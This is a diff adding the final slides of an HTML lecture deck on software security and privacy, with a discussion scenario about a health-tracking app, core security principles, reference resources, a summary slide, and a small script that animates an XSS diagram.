+                    <li>☁️ <strong>Cloud Security</strong> - Shared responsibility model</li>
+                    <li>🔐 <strong>Quantum Computing</strong> - Breaking current encryption</li>
+                    <li>📱 <strong>Mobile Threats</strong> - App permissions, device loss</li>
+                    <li>🏭 <strong>Supply Chain Attacks</strong> - Third-party compromises</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Slide 43: Group Discussion -->
+        <div class="slide">
+            <h1>Group Discussion <span class="emoji">💬</span></h1>
+            <div class="activity-box">
+                <h3>Scenario Analysis (15 minutes)</h3>
+                <p><strong>Scenario:</strong> You're building a health tracking app that collects:</p>
+                <ul>
+                    <li>User location (for running routes)</li>
+                    <li>Heart rate and fitness data</li>
+                    <li>Diet and medication information</li>
+                    <li>Social connections (workout buddies)</li>
+                </ul>
+                
+                <p><strong>Discuss:</strong></p>
+                <ol>
+                    <li>What security threats should you consider?</li>
+                    <li>What privacy regulations apply?</li>
+                    <li>How would you implement authentication?</li>
+                    <li>What data should be encrypted?</li>
+                </ol>
+            </div>
+            <button data-timer="15">Start 15-Minute Timer</button>
+        </div>
+
+        <!-- Slide 44: Key Takeaways -->
+        <div class="slide">
+            <h1>Key Security & Privacy Principles</h1>
+            
+            <div class="privacy-principle">
+                <h3>Remember These Core Concepts:</h3>
+                <ol style="font-size: 1.3em; line-height: 2;">
+                    <li>🛡️ Defense in depth - Multiple layers of security</li>
+                    <li>🔐 Least privilege - Minimum necessary access</li>
+                    <li>✅ Input validation - Never trust user input</li>
+                    <li>🔒 Encrypt sensitive data - In transit and at rest</li>
+                    <li>👤 Privacy by design - Build it in from the start</li>
+                    <li>📋 Comply with regulations - Know your obligations</li>
+                    <li>🎓 Security awareness - Train all stakeholders</li>
+                </ol>
+            </div>
+        </div>
+
+        <!-- Slide 45: Resources -->
+        <div class="slide">
+            <h1>Security & Privacy Resources</h1>
+            
+            <div class="demo-box">
+                <h3>📚 Essential References:</h3>
+                <ul style="font-size: 1.2em; line-height: 1.8;">
+                    <li>🌐 <strong>OWASP.org</strong> - Security best practices</li>
+                    <li>📖 <strong>NIST Cybersecurity Framework</strong> - Standards</li>
+                    <li>🔐 <strong>Have I Been Pwned</strong> - Breach checking</li>
+                    <li>📋 <strong>GDPR.eu</strong> - Privacy regulations</li>
+                    <li>🛡️ <strong>SANS Institute</strong> - Security training</li>
+                    <li>🔍 <strong>CVE Database</strong> - Vulnerability tracking</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Final Slide: Summary -->
+        <div class="slide">
+            <h1>Today's Achievements <span class="emoji">🎓</span></h1>
+            <h2>You Can Now:</h2>
+            <ul style="font-size: 1.3em; line-height: 2;">
+                <li>✅ Identify and defend against common attacks</li>
+                <li>✅ Implement strong authentication and authorization</li>
+                <li>✅ Apply encryption appropriately</li>
+                <li>✅ Understand privacy regulations and compliance</li>
+                <li>✅ Follow security best practices in development</li>
+                <li>✅ Create privacy-respecting applications</li>
+            </ul>
+            <div class="demo-box">
+                <p><strong>Next Class:</strong> Reliable Programming - Building resilient software</p>
+            </div>
+        </div>
+
+        <!-- Navigation Controls -->
+        <div class="navigation">
+            <button id="prevBtn">Previous</button>
+            <span class="slide-counter">
+                <span id="currentSlide">1</span> / <span id="totalSlides">46</span>
+            </span>
+            <button id="nextBtn">Next</button>
+        </div>
+    </div>
+
+    <!-- Shared Presentation JavaScript -->
+    <script src="../../js/presentation.js"></script>
+
+    <!-- Lecture-Specific JavaScript -->
+    <script>
+        // Security-specific interactions
+        document.addEventListener('slidechange', (e) => {
+            // Could add specific animations or interactions for certain slides
+            const currentSlideNum = e.detail.currentSlide + 1;
+            
+            // Example: Trigger animation on specific slides
+            if (currentSlideNum === 9) { // XSS diagram slide
+                // Could animate the attack flow
+                const steps = document.querySelectorAll('.attack-step');
+                steps.forEach((step, index) => {
+                    setTimeout(() => {
+                        step.style.transform = 'scale(1.05)';
+                        setTimeout(() => {
+                            step.style.transform = 'scale(1)';
+                        }, 300);
+                    }, index * 500);
+                });
+            }
+        });
+    </script>
+</body>
+</html>
